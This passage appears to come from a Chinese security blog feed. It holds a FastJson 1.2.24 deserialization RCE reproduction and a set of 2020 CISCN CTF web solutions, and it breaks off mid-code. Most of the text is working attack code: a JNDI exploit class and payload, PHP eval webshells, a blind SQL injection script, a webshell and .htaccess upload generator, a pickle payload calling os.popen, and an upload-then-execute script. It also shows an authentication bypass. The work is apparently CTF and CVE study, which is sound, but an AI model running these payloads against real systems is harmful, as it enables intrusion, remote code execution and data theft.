      <title>FastJson1.2.24调试记录_复现</title>
      <link href="2020/10/05/FastJson1.2.24%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95_%E5%A4%8D%E7%8E%B0/"/>
      <url>2020/10/05/FastJson1.2.24%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95_%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="FastJson1-2-23-反序列化复现"><a href="#FastJson1-2-23-反序列化复现" class="headerlink" title="FastJson1.2.23 反序列化复现"></a>FastJson1.2.23 反序列化复现</h1><p>漏洞exp:</p><pre><code class="java">public class Exploit implements ObjectFactory {    public Object getObjectInstance(Object var1, Name var2, Context var3, Hashtable&lt;?, ?&gt; var4) {        exec(&quot;xterm&quot;);        return null;    }    public static String exec(String var0) {        try {            Runtime.getRuntime().exec(&quot;calc.exe&quot;);        } catch (IOException var2) {            var2.printStackTrace();        }        return &quot;&quot;;    }}</code></pre><p>FastJsonTest.java</p><pre><code class="java">public class App {    public static void main( String[] args )    {        String payload=&quot;{\n&quot; +                &quot;    \&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,&quot; +                &quot;    \&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1389/Exploit\&quot;,&quot; +                &quot;    \&quot;autoCommit\&quot;:true\n&quot; +                &quot;}&quot;;        JSON.parseObject(payload);    }}</code></pre><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>一步一步跟进去在<br>parseObject:320, DefaultJSONParser (com.alibaba.fastjson.parser)<br>发现了关于@type的处理</p><pre><code>if (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) {    String typeName = lexer.scanSymbol(symbolTable, &#39;&quot;&#39;);    Class&lt;?&gt; clazz = TypeUtils.loadClass(typeName, config.getDefaultClassLoader());    ...    ObjectDeserializer deserializer = config.getDeserializer(clazz);    return deserializer.deserialze(this, clazz, fieldName);}</code></pre><p>跟下去观察到是通过<code>Thread.currentThread().getContextClassLoader().loadClass(className);</code><br>来加载@type的对应的值<br>跟进config.getDeserializer(clazz);<br>最后是通过<code>derializer = createJavaBeanDeserializer(clazz, type);</code>来生成反序列化处理器</p><pre><code>public ObjectDeserializer createJavaBeanDeserializer(Class&lt;?&gt; clazz, Type type) {        boolean asmEnable = this.asmEnable;//不是安卓设备则为true        if (asmEnable) {            JSONType jsonType = clazz.getAnnotation(JSONType.class);            if (jsonType != null) {//检测是否存在JSONType注释                ...            }            if (asmEnable) {                Class&lt;?&gt; superClass = JavaBeanInfo.getBuilderClass(jsonType);//传入null                if (superClass == null) {                    superClass = clazz;                }                for (;;) {//检查clazz及其所有父类是否均为public                    if (!Modifier.isPublic(superClass.getModifiers())) {                        asmEnable = false;                        break;                    }                    superClass = superClass.getSuperclass();                    if (superClass == Object.class || superClass == null) {                        break;                    }                }            }        }        if (clazz.getTypeParameters().length != 0) {//没有使用泛型            asmEnable = false;        }        if (asmEnable &amp;&amp; asmFactory != null &amp;&amp; asmFactory.classLoader.isExternalClass(clazz)) {            asmEnable = false;        }        if (asmEnable) {//类名不存在.和不可见字符            asmEnable = ASMUtils.checkName(clazz.getSimpleName());        }        if (asmEnable) {            if (clazz.isInterface()) {                asmEnable = false;            }            JavaBeanInfo beanInfo = JavaBeanInfo.build(clazz, type, propertyNamingStrategy);            if (asmEnable &amp;&amp; beanInfo.fields.length &gt; 200) {                asmEnable = false;            }            Constructor&lt;?&gt; defaultConstructor = beanInfo.defaultConstructor;            if (asmEnable &amp;&amp; defaultConstructor == null &amp;&amp; !clazz.isInterface()) {                asmEnable = false;            }            for (FieldInfo fieldInfo : beanInfo.fields) {                ...            }        }        if (asmEnable) {            if (clazz.isMemberClass() &amp;&amp; !Modifier.isStatic(clazz.getModifiers())) {                asmEnable = false;            }        }        if (!asmEnable) {            return new JavaBeanDeserializer(this, clazz, type);        }        JavaBeanInfo beanInfo = JavaBeanInfo.build(clazz, type, propertyNamingStrategy);        try {            return asmFactory.createJavaBeanDeserializer(this, beanInfo);            // } catch (VerifyError e) {            // e.printStackTrace();            // return new JavaBeanDeserializer(this, clazz, type);        } catch (NoSuchMethodException ex) {            return new JavaBeanDeserializer(this, clazz, type);        } catch (JSONException asmError) {            return new JavaBeanDeserializer(this, beanInfo);        } catch (Exception e) {            throw new JSONException(&quot;create asm deserializer error, &quot; + clazz.getName(), e);        }    }</code></pre><p>阅读代码发现：</p><pre><code>1. 不是安卓设备2. clazz是否存在JSONType注释3. clazz及其所有父类都是public4. clazz类的声明没有使用泛型5. clazz的类名不存在.</code></pre><p>经过上述检查后进入<code>JavaBeanInfo beanInfo = JavaBeanInfo.build(clazz, type, propertyNamingStrategy);</code></p><pre><code>    public static JavaBeanInfo build(Class&lt;?&gt; clazz, Type type, PropertyNamingStrategy propertyNamingStrategy) {        JSONType jsonType = clazz.getAnnotation(JSONType.class);        Class&lt;?&gt; builderClass = getBuilderClass(jsonType);        Field[] declaredFields = clazz.getDeclaredFields();//获取所有字段        Method[] methods = clazz.getMethods();//获取所有public方法        Constructor&lt;?&gt; defaultConstructor = getDefaultConstructor(builderClass == null ? clazz : builderClass);        Constructor&lt;?&gt; creatorConstructor = null;        Method buildMethod = null;        List&lt;FieldInfo&gt; fieldList = new ArrayList&lt;FieldInfo&gt;();        if (defaultConstructor == null &amp;&amp; !(clazz.isInterface() || Modifier.isAbstract(clazz.getModifiers()))) {           ...         }        if (defaultConstructor != null) {            TypeUtils.setAccessible(defaultConstructor);        }        if (builderClass != null) {            ...        }        for (Method method : methods) { //            int ordinal = 0, serialzeFeatures = 0, parserFeatures = 0;            String methodName = method.getName();            if (methodName.length() &lt; 4) {                continue;            }//方法名大于4            if (Modifier.isStatic(method.getModifiers())) {                continue;            }//非静态方法            // support builder set            if (!(method.getReturnType().equals(Void.TYPE) || method.getReturnType().equals(method.getDeclaringClass()))) {                continue;            }//返回值是void 或 clazz类            Class&lt;?&gt;[] types = method.getParameterTypes();            if (types.length != 1) {                continue;            }//只有一个参数            ...            if (!methodName.startsWith(&quot;set&quot;)) { // TODO &quot;set&quot;的判断放在 JSONField 注解后面，意思是允许非 setter 方法标记 JSONField 注解？                continue;            }//方法名以set开头            char c3 = methodName.charAt(3);            String propertyName;            if (Character.isUpperCase(c3) //set后的第一个字符必须是大写或_或f                || c3 &gt; 512 // for unicode method name            ) //获得set方法对应的字段            {                if (TypeUtils.compatibleWithJavaBean) {                    propertyName = TypeUtils.decapitalize(methodName.substring(3));                } else {                    propertyName = Character.toLowerCase(methodName.charAt(3)) + methodName.substring(4);                }            } else if (c3 == &#39;_&#39;) {                propertyName = methodName.substring(4);            } else if (c3 == &#39;f&#39;) {                propertyName = methodName.substring(3);            } else if (methodName.length() &gt;= 5 &amp;&amp; Character.isUpperCase(methodName.charAt(4))) {                propertyName = TypeUtils.decapitalize(methodName.substring(3));            } else {                continue;            }            Field field = TypeUtils.getField(clazz, propertyName, declaredFields);            if (field == null &amp;&amp; types[0] == boolean.class) {//字段不存在或是bool型                String isFieldName = &quot;is&quot; + Character.toUpperCase(propertyName.charAt(0)) + propertyName.substring(1);                field = TypeUtils.getField(clazz, isFieldName, declaredFields);            }            ...            add(fieldList, new FieldInfo(propertyName, method, field, clazz, type, ordinal, serialzeFeatures, parserFeatures,                                         annotation, fieldAnnotation, null));//添加到fieldList        }        for (Field field : clazz.getFields()) { // 添加非静态字段            int modifiers = field.getModifiers();            if ((modifiers &amp; Modifier.STATIC) != 0) {//不允许STATIC                continue;            }            if((modifiers &amp; Modifier.FINAL) != 0) {                Class&lt;?&gt; fieldType = field.getType();                boolean supportReadOnly = Map.class.isAssignableFrom(fieldType)                         || Collection.class.isAssignableFrom(fieldType)                        || AtomicLong.class.equals(fieldType) //                        || AtomicInteger.class.equals(fieldType) //                        || AtomicBoolean.class.equals(fieldType);                if (!supportReadOnly) {                    continue;                }            }            boolean contains = false;            for (FieldInfo item : fieldList) {                if (item.name.equals(field.getName())) {                    contains = true;                    break; // 已经是 contains = true，无需继续遍历                }            }            if (contains) {                continue;            }            int ordinal = 0, serialzeFeatures = 0, parserFeatures = 0;            String propertyName = field.getName();            ...            add(fieldList, new FieldInfo(propertyName, null, field, clazz, type, ordinal, serialzeFeatures, parserFeatures, null,                                         fieldAnnotation, null));        }        for (Method method : clazz.getMethods()) { // getter methods            String methodName = method.getName();            if (methodName.length() &lt; 4) {                continue;            }            if (Modifier.isStatic(method.getModifiers())) {                continue;            }            if (methodName.startsWith(&quot;get&quot;) &amp;&amp; Character.isUpperCase(methodName.charAt(3))) {                if (method.getParameterTypes().length != 0) {                    continue;                }                if (Collection.class.isAssignableFrom(method.getReturnType()) //                    || Map.class.isAssignableFrom(method.getReturnType()) //                    || AtomicBoolean.class == method.getReturnType() //                    || AtomicInteger.class == method.getReturnType() //                    || AtomicLong.class == method.getReturnType() //                ) {                    String propertyName;                    ...                    FieldInfo fieldInfo = getField(fieldList, propertyName);                    if (fieldInfo != null) {                        continue;                    }                    if (propertyNamingStrategy != null) {                        propertyName = propertyNamingStrategy.translate(propertyName);                    }                    add(fieldList, new FieldInfo(propertyName, method, null, clazz, type, 0, 0, 0, annotation, null, null));                }            }        }        return new JavaBeanInfo(clazz, builderClass, defaultConstructor, null, null, buildMethod, jsonType, fieldList);    }</code></pre><p>大致总结一下会将哪些字段添加到FieldList中：</p><pre><code>1. 存在public的set方法的字段（方法名的set后的第一个字符是大写或_）2. 非Static和Final的字段（是的话要满足某些条件）3. 返回值是满足某些条件的非静态get方法对应的字段</code></pre><p>最后返回排序后的FieldList,生成deserializer<br>接着调用了<code>return deserializer.deserialze(this, clazz, fieldName);</code><br>在程序执行错误(成功弹出计算器后的报错信息)的时候下断点进入<code>parseField</code><br><code>@type</code>字典下的其他字段,会进入<br><code>boolean match = parseField(parser, key, object, type, fieldValues);</code></p><pre><code>    public boolean parseField(DefaultJSONParser parser, String key, Object object, Type objectType,                              Map&lt;String, Object&gt; fieldValues) {        JSONLexer lexer = parser.lexer; // xxx        FieldDeserializer fieldDeserializer = smartMatch(key);//如果fieldList没有这个字段则返回null        final int mask = Feature.SupportNonPublicField.mask;        ...        lexer.nextTokenWithColon(fieldDeserializer.getFastMatchToken());        fieldDeserializer.parseField(parser, object, objectType, fieldValues);        return true;    }</code></pre><p>在fieldList字段查找存在后进入<code>fieldDeserializer.parseField(parser, object, objectType, fieldValues);</code></p><pre><code>    public void parseField(DefaultJSONParser parser, Object object, Type objectType, Map&lt;String, Object&gt; fieldValues) {        ...        Object value;        if (fieldValueDeserilizer instanceof JavaBeanDeserializer) {            JavaBeanDeserializer javaBeanDeser = (JavaBeanDeserializer) fieldValueDeserilizer;            value = javaBeanDeser.deserialze(parser, fieldType, fieldInfo.name, fieldInfo.parserFeatures);        } else {            ...            } else {                value = fieldValueDeserilizer.deserialze(parser, fieldType, fieldInfo.name);//获取值            }        }        if (parser.getResolveStatus() == DefaultJSONParser.NeedToResolve) {            ...        } else {            if (object == null) {                fieldValues.put(fieldInfo.name, value);            } else {                setValue(object, value);//进入这里            }        }    }</code></pre><p>最后进入setValue</p><pre><code>ublic void setValue(Object object, Object value) {        if (value == null //            &amp;&amp; fieldInfo.fieldClass.isPrimitive()) {            return;        }        try {            Method method = fieldInfo.method;            if (method != null) {                if (fieldInfo.getOnly) {                    ...                } else {                    method.invoke(object, value);                }                return;            } else {                ...            }        } catch (Exception e) {            throw new JSONException(&quot;set property error, &quot; + fieldInfo.name, e);        }    }</code></pre><p>进入对应字段的set或者get方法</p><p>至此FastJson的洞已经分析完了，接下来就是如何利用这个任意set/get方法调用从而RCE了<br>因为以下payload能成功</p><pre><code class="java">import com.sun.rowset.JdbcRowSetImpl;public class CLIENT {    public static void main(String[] args) throws Exception {        JdbcRowSetImpl JdbcRowSetImpl_inc = new JdbcRowSetImpl();//只是为了方便调用        JdbcRowSetImpl_inc.setDataSourceName(&quot;rmi://127.0.0.1:1099/aa&quot;);//可控uri        JdbcRowSetImpl_inc.setAutoCommit(true);    }}</code></pre><p>且符合</p><ul><li><input checked="" disabled="" type="checkbox"> 方法名长度大于4且以set开头，且第四个字母要是大写</li><li><input checked="" disabled="" type="checkbox"> 非静态方法</li><li><input checked="" disabled="" type="checkbox"> 返回类型为void或当前类</li><li><input checked="" disabled="" type="checkbox"> 参数个数为1个<br>这些条件<br>RCE达成</li></ul><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/10/05/FastJson1.2.24调试记录_复现/">https://www.ccreater.top/2020/10/05/FastJson1.2.24调试记录_复现/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> cve复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> java </tag>
            
            <tag> 复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 ciscn 华东南 web</title>
      <link href="2020/10/04/2020%20ciscn%20%E5%8D%8E%E4%B8%9C%E5%8D%97%20web/"/>
      <url>2020/10/04/2020%20ciscn%20%E5%8D%8E%E4%B8%9C%E5%8D%97%20web/</url>
      
        <content type="html"><![CDATA[<h1 id="2020-CISCN-华东南赛区"><a href="#2020-CISCN-华东南赛区" class="headerlink" title="2020 CISCN 华东南赛区"></a>2020 CISCN 华东南赛区</h1><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><pre><code>zip -r is useful, and don&#39;t forget /var/www/html/***********/cat.php</code></pre><p>访问<a href="http://www.zip拿到源码" target="_blank" rel="noopener">www.zip拿到源码</a></p><p>利用<code>$msg = sprintf($msg, $value);</code>打印文件上传位置<code>me0w_mE0w_miA0</code></p><p>访问<code>me0w_mE0w_miA0/cat.php</code>提示vim,拿到源码</p><p>cat.php</p><pre><code class="php">&lt;?phperror_reporting(0);include(&#39;../waf.php&#39;);session_start();/*Login check*/if(!$_SESSION[&#39;islogin&#39;]){    die(&#39;Who are you?&#39;);}else{    //class is waf~    echo &quot;&lt;h4 align=&#39;center&#39;&gt;Hello,ctfer&lt;/h4&gt;&quot;;    echo &quot;&lt;h4 align=&#39;center&#39;&gt;But I am only a little cat......really?&lt;/h4&gt;&quot;;    echo &#39;&lt;br&gt;&lt;div align=&quot;center&quot;&gt;&lt;img src=&quot;../images/cat2.jpg&quot; align=&quot;center&quot; /&gt;&lt;/div&gt;&lt;/br&gt;&#39;;    $a=new waf();    spl_autoload_register();    if(isset($_COOKIE[&quot;filenames&quot;]))    {        $a-&gt;data=$_COOKIE[&quot;filenames&quot;];        $a-&gt;upload_check();        echo &quot;&lt;h3 align=&#39;center&#39;&gt;The Winning Formula is complete!&lt;/h3&gt;&quot;;        $filenames=unserialize($_COOKIE[&quot;filenames&quot;]);    }else{        $filenames=&#39;kee1ongz.meow&#39;;        file_put_contents($filenames,&#39; Meow~meow,meow~&#39;);    }}?&gt;</code></pre><p>spl_autoload_register();没有任何参数的情况下调用spl_autoload();</p><blockquote><ul><li><code>class_name</code></li></ul><ul><li><code>file_extensions</code></li></ul><p>在默认情况下，本函数先将类名转换成小写，再在小写的类名后加上 .inc       或 .php 的扩展名作为文件名，然后在所有的包含路径(include paths)中检查是否存在该文件。 </p></blockquote><p>上传fffffffffffuck.inc</p><pre><code>&lt;?php     class fffffffffffuck{        public function __wakeup(){            eval($_POST[1]);        }    }</code></pre><p>反序列化:<code>O:13:&quot;ffffffffffuck&quot;:0:[]</code>，将{}换为:<code>[]</code>虽然反序列化失败，但是还是调用了<code>__wakeup</code></p><p>拿到flag:<code>ciscn{keQXj78JHVUKjssqgD}</code></p><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>提示source.php,composer</p><pre><code class="php">&lt;?phperror_reporting(0);highlight_file(__FILE__);    if($_SERVER[&#39;REMOTE_ADDR&#39;] === &#39;127.0.0.1&#39;){        $content = file_get_contents(&#39;php://filter/read=convert.base64-encode/resource=file:///var/www/html/excel.php&#39;);        file_get_contents(&#39;http://&#39;.$_GET[&#39;ip&#39;].&#39;/?&#39;.$content);    }    else{        die(&#39;only for localhost&#39;);    }?&gt;</code></pre><p>composer.json</p><pre><code>{    &quot;require&quot;: {        &quot;phpoffice/phpspreadsheet&quot;: &quot;1.5.0&quot;    }}</code></pre><p>hint给你excel.php的源码</p><pre><code class="php">&lt;?phperror_reporting(0);require &#39;vendor/autoload.php&#39;;$r = \PhpOffice\PhpSpreadsheet\IOFactory::createReader(&#39;Xlsx&#39;);$r-&gt;setReadDataOnly(TRUE);$fileInfo = $_FILES[&quot;filename&quot;];$filePath = $fileInfo[&quot;tmp_name&quot;];try {$data = $r-&gt;load($filePath)-&gt;getSheet(0)-&gt;toArray(); }catch (Exception $e) {die(&#39;illegal xlsx file!&#39;);}$s = &#39;&#39;;$s = $s.&#39;&lt;table&gt;&#39;;foreach($data as $a)    {    $s = $s.&#39;&lt;tr&gt;&#39;;    foreach($a as $i)    {        $s = $s.&quot;&lt;td style=\&quot;text-align:center\&quot;&gt;&lt;h2&gt;&quot;.$i.&quot;&lt;/h2&gt;&lt;/td&gt;&quot;;    }    $s = $s.&#39;&lt;/tr&gt;&#39;;    }$s = $s.&#39;&lt;/table&gt;&#39;;stream_wrapper_unregister(&#39;php&#39;);chdir(&#39;users/&#39;);$fd = (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])?$_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]:$_SERVER[&#39;REMOTE_ADDR&#39;]);mkdir($fd);//data:chdir($fd);file_put_contents(&#39;profile&#39;,$s);$f = basename(getcwd()).&#39;/profile&#39;;//data:,/profilechdir(&#39;..&#39;);if(!stripos(file_get_contents($f),&#39;&lt;?&#39;) &amp;&amp; !stripos(file_get_contents($f),&#39;php&#39;)) {    include($f);}else die(&#39;no!&#39;);?&gt;</code></pre><p>file_get_contents在处理data:,xxxxxx时会直接取xxxxxx<br>而include会包含文件名为data:,xxxxxx的文件</p><p>但是我们无法直接创建<code>data:</code>的文件夹</p><p>先用<code>./data:</code>创建<code>data:</code>文件夹</p><p>再用<code>data:</code>来绕过<code>if(!stripos(file_get_contents($f),&#39;&lt;?&#39;) &amp;&amp; !stripos(file_get_contents($f),&#39;php&#39;))</code></p><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p><a href="http://www.zip直接下载，翻源码审计。" target="_blank" rel="noopener">www.zip直接下载，翻源码审计。</a></p><p>登录这边看这login.php构造一下符合正则规则的参数就好了，登了取下sessionid</p><p>然后qr.php里，sql注入明显的点，直接拼接的，<code>$data</code>来自于扫描二维码得到的数据，二维码里是个json：<code>{&quot;id&quot;:&quot;xxxx&quot;}</code>。</p><pre><code class="php">$sql=&quot;insert into record(p_id, userid)values (&#39;&quot;.$data[&#39;id&#39;].&quot;&#39;,&#39;&quot;.$user-&gt;getCardID().&quot;&#39;);&quot;;</code></pre><p>写盲注脚本爆破一下：</p><pre><code class="python">import requests, timeimport qrcodefrom requests.adapters import HTTPAdapterSQL = &quot;(select group_concat(flag) from flag)&quot;GETCONTENT = &quot;&#39;or(if( ascii(substr((&quot; + SQL + &quot;),%d,1)) &lt;= %d, sleep(5), 0))or&#39;&quot;GETLENGTH = &quot;&#39;or(if( length((&quot; + SQL + &quot;)) &lt;= %d, sleep(5), 0))or&#39;&quot;THRESHOLD = 5STRLEN = 32session = requests.Session()session.mount(&#39;http://&#39;, HTTPAdapter(max_retries=10))def guess(payload, strpos=None):    l = 0    r = 255    while l &lt; r:        mid = (l+r)//2        if strpos is None:            sql = payload % (mid)        else:            sql = payload % (strpos, mid)        if check(sql) == True:            r = mid            print(&#39;guess &lt;=&#39;, r)        else:            l = mid + 1            print(&#39;guess &gt;&#39;, l)    return ldef check(payload):    qr = qrcode.make(&#39;{&quot;id&quot;:&quot;&#39; + payload + &#39;&quot;}&#39;)    qr.save(&#39;qr.png&#39;)    start = time.perf_counter()    x = session.post(        url=&#39;http://172.20.6.103/qr.php&#39;,        cookies={            &#39;PHPSESSID&#39;: &#39;fe940a8329992285f77487f96c575d29&#39;        },        files={            &quot;file&quot;: open(&quot;qr.png&quot;, &quot;rb&quot;),            &quot;Content-Type&quot;: &quot;application/octet-stream&quot;,            &quot;Content-Disposition&quot;: &quot;form-data&quot;,            &quot;filename&quot;: &quot;qr.png&quot;        },        timeout=(2, 8)    )    end = time.perf_counter()    print(payload, end-start)    if end-start &gt; THRESHOLD:        return True    else:        return Falsedef getlength():    global STRLEN    STRLEN = guess(GETLENGTH)    print(&#39;LEN:&#39;, STRLEN)def getcontent():    content = &#39;&#39;    for strpos in range(1, STRLEN+1):        ch = guess(GETCONTENT, strpos)        content += chr(ch)        print(&#39;CHR:&#39;, chr(ch), &#39;CONTENT:&#39;, content)if __name__ == &#39;__main__&#39;:    getlength()    getcontent()</code></pre><h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><pre><code>&lt;?phpclass GetPass{}class Upload{}$y1ng = new GetPass;$y1ng-&gt;abandon = new GetPass;$y1ng-&gt;abandon-&gt;abandon =new Upload;$y1ng-&gt;abandon-&gt;boring =&quot;1&quot;;$y1ng-&gt;abandon-&gt;code =&quot;1&quot;;$y1ng-&gt;boring = &#39;read&#39;;$y1ng-&gt;code = &#39;hidden&#39;;$c = new GetPass;$c-&gt;abandon = new GetPass;$c-&gt;abandon-&gt;abandon =new Upload;$c-&gt;abandon-&gt;boring =&quot;1&quot;;$c-&gt;abandon-&gt;code =&quot;1&quot;;$c-&gt;boring = &#39;read&#39;;$c-&gt;code = this;$ser = serialize([$y1ng,$c]);var_dump(urlencode($ser));</code></pre><p>拿到pass=ob_end_clean_is_surplus</p><p>文件上传与网上某题相近</p><p>exp.py</p><pre><code class="python">SIZE_HEADER = b&quot;\n\n#define width 1337\n#define height 1337\n\n&quot;def generate_php_file(filename, script):    phpfile = open(filename, &#39;wb&#39;)     phpfile.write(script.encode(&#39;utf-16be&#39;))    phpfile.write(SIZE_HEADER)    phpfile.close()def generate_htacess():    htaccess = open(&#39;.htaccess&#39;, &#39;wb&#39;)    htaccess.write(SIZE_HEADER)    htaccess.write(b&#39;AddType application/x-httpd-php .fuck\n&#39;)    htaccess.write(b&#39;php_value zend.multibyte 1\n&#39;)    htaccess.write(b&#39;php_value zend.detect_unicode 1\n&#39;)    htaccess.write(b&#39;php_value display_errors 1\n&#39;)    htaccess.close()generate_htacess()generate_php_file(&quot;webshell.fuck&quot;, &quot;&lt;?php eval($_POST[1]); ?&gt;&quot;)</code></pre><p>分别上传webshell.fuck,还有.htaccess拿到flag</p><h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><pre><code>ccopy_reg_reconstructorp0(c__main__webSitep1c__builtin__objectp2Ntp3Rp4(dp5Vnamep6c__builtin__getattr(cospopen(S&#39;dir&#39;tRS&#39;read&#39;tR(NtRp7sVdescribep8V2p9sb.</code></pre><p>提权没环境复现</p><h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><pre><code class="python">import requestsurl=&quot;http://172.20.6.106:80/&quot;burp0_url = &quot;http://172.20.6.106:80/index.php&quot;burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;Origin&quot;: &quot;http://172.20.6.106&quot;, &quot;Content-Type&quot;: &quot;multipart/form-data; boundary=----WebKitFormBoundary6ssqFd6DiMBBDuHJ&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://172.20.6.106/index.php&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en;q=0.8&quot;, &quot;x-forwarded-for&quot;: &quot;127.0.0.1&quot;, &quot;Connection&quot;: &quot;close&quot;}burp0_data = &quot;------WebKitFormBoundary6ssqFd6DiMBBDuHJ\r\nContent-Disposition: form-data; name=\&quot;file\&quot;; filename=\&quot;htaccess\&quot;\r\nContent-Type: application/octet-stream\r\n\r\nSetHandler application/x-httpd-php\r\n------WebKitFormBoundary6ssqFd6DiMBBDuHJ\r\nContent-Disposition: form-data; name=\&quot;name\&quot;\r\n\r\n.htaccess\r\n------WebKitFormBoundary6ssqFd6DiMBBDuHJ--\r\n&quot;requests.post(burp0_url, headers=burp0_headers, data=burp0_data)burp0_headers = {&quot;Pragma&quot;: &quot;no-cache&quot;, &quot;Cache-Control&quot;: &quot;no-cache&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36&quot;, &quot;Origin&quot;: &quot;http://172.20.6.106&quot;, &quot;Content-Type&quot;: &quot;multipart/form-data; boundary=----WebKitFormBoundarywAeLpgB3HhSWqVLj&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://172.20.6.106/index.php&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en;q=0.8&quot;, &quot;x-forwarded-for&quot;: &quot;127.0.0.1&quot;, &quot;Connection&quot;: &quot;close&quot;}burp0_data = &quot;------WebKitFormBoundarywAeLpgB3HhSWqVLj\r\nContent-Disposition: form-data; name=\&quot;file\&quot;; filename=\&quot;shell1.jpg\&quot;\r\nContent-Type: image/jpeg\r\n\r\n&lt;?php\neval($_POST[&#39;a&#39;]);\n?&gt;\r\n------WebKitFormBoundarywAeLpgB3HhSWqVLj\r\nContent-Disposition: form-data; name=\&quot;name\&quot;\r\n\r\n2.jpg\r\n------WebKitFormBoundarywAeLpgB3HhSWqVLj--\r\n&quot;requests.post(burp0_url, headers=burp0_headers, data=burp0_data)burp0_data={&quot;a&quot;:&quot;system(&#39;cat /flag.txt&#39;);&quot;}r=requests.post(url+&quot;upload/2.jpg&quot;, data=burp0_data)print(r.text)</code></pre><h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><p>浏览一遍代码后发现一个弱类型比较</p><pre><code class="php">function getUser(){    if (!isset($_SESSION[&quot;token&quot;])) {        return -1;  //not login    } else if ($_SESSION[&quot;token&quot;] == &quot;0&quot;) {        return 0;   //Administrator//0e绕过    } else {        $key = base64_decode($_SESSION[&quot;token&quot;]);        $user = explode(&quot;|&quot;, $key)[0]; //user        if (!$user) {            return -1;        }        return $user;    }}</code></pre><p>如果我们能令token以0e[0-9]+的格式的话，就可以绕过身份验证机制</p><p>而生成token的代码为：</p><pre><code class="php">function setUser($username, $password){    $ip = $_SERVER[&quot;REMOTE_ADDR&quot;];    if ($username == &#39;admin&#39;) {        if ($ip == &quot;::1&quot; || $ip == &quot;127.0.0.1&quot;){            $_SESSION[&quot;token&quot;] = 0;     //Administrator        }else{            die(&#39;修罗！隐忍！！！&#39;);        }    } else {        $key = $username . &quot;|&quot; . $password;        $_SESSION[&quot;token&quot;] = base64_encode($key);    }}</code></pre><p>因为0e[0-9]+是在base64中的所以我们构造：<code>username=%D1%EDv%EF%BE&amp;password=%D7m%F8</code></p><p>至此获得admin权限</p><p>upload处有个任意文件上传，但是我们不知道admin的上传目录，我们不得不进行sql注入</p><p>notes.php处有个神奇的todo:</p><pre><code class="php">if (isset($_POST[&#39;contents&#39;])) {    $data = getCache();    if ($data &amp;&amp; $data-&gt;contents == $_POST[&#39;contents&#39;]) {        $username = $data-&gt;username;        $contents = $data-&gt;contents;    } else {        $contents = $_POST[&#39;contents&#39;];    }    if (isset($_POST[&#39;cache&#39;])) {        setCache($username, $contents);        echo &quot;&lt;script&gt;alert(&#39;缓存成功&#39;);location.href=&#39;index.php&#39;&lt;/script&gt;&quot;;    } else {        setcookie(&#39;cache&#39;);        $sql = &quot;INSERT INTO notes (uid, contents, time) VALUES ((select id from users where username = &#39;${username}&#39;), &#39;${contents}&#39;, localtime())&quot;;        echo $sql;        if ($conn-&gt;query($sql) === TRUE) {            echo &quot;&lt;script&gt;alert(&#39;提交成功&#39;);location.href=&#39;index.php&#39;&lt;/script&gt;&quot;;        } else {            echo &quot;Error: &quot; . $sql . &quot;&lt;br&gt;&quot; . $conn-&gt;error;            //TODO:删掉        }    }}</code></pre><p>如果我们能控制$data-&gt;contents == $_POST[‘contents’]，且可以控制<code>$data-&gt;username</code>出现引号逃出引号的包围，就可以进行sql注入了。</p><p>而我们的缓存的加密函数是：</p><pre><code class="php">class CBCCrypt {    private $iv;    private $encryptKey;    public function __construct()    {        $this-&gt;iv = &quot;cbcisfunsoisbase&quot;;        $this-&gt;encryptKey =  file_get_contents(&quot;secret.txt&quot;);    }    public function encrypt($encryptStr) {        $iv = $this-&gt;iv;        $encryptKey = $this-&gt;encryptKey;        $encrypted=openssl_encrypt($encryptStr, &#39;aes-128-cbc&#39;, $encryptKey, true, $iv);        return base64_encode($iv.$encrypted);    }    public function decrypt($encryptStr) {        $iv = substr(base64_decode($encryptStr),0,16);        $encryptKey = $this-&gt;encryptKey;        $encrypted = 